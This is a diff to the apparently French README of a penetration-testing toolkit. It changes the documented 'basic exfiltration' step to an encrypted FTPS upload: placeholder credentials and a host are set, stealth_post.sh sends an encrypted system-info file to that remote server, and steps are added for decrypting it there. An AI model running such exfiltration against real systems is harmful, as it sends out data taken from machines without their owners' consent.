@@ -93,13 +93,21 @@ bash scripts/linux/pentest_verification.sh
 # Phase d'exploitation (si autorisée)
 bash scripts/linux/pentest_exploitation.sh
 # Génère un fichier de suggestions avec searchsploit si des CVE ont été détectées
-# Exfiltration basique (si autorisée)
+# Exfiltration basique via FTPS (si autorisée)
 export FTP_USER="utilisateur"
 export FTP_PASS="motdepasse"
 export FTP_HOST="exemple.com"
-export FTP_PATH="uploads/sysinfo.txt"
+export FTP_PATH="uploads/sysinfo.txt.gpg"
+export GPG_PASSPHRASE="phrase_secrete"
 bash scripts/linux/stealth_post.sh
 ```
+
+### Configuration de l'hôte distant
+
+- Serveur FTP avec prise en charge de FTPS (TLS explicite).
+- Compte utilisateur autorisé à écrire dans le chemin indiqué par `$FTP_PATH`.
+- Pour récupérer les données, télécharger le fichier chiffré puis le déchiffrer :
+  `gpg --batch --passphrase "phrase_secrete" -o sysinfo.txt -d sysinfo.txt.gpg`.
 
 Chaque exécution de `pentest_discovery.sh` crée un sous-dossier horodaté dans `pentest_results`, conservant les résultats des scans précédents.
 Each run of `pentest_discovery.sh` outputs to a timestamped subfolder inside `pentest_results`, preserving previous scan results.
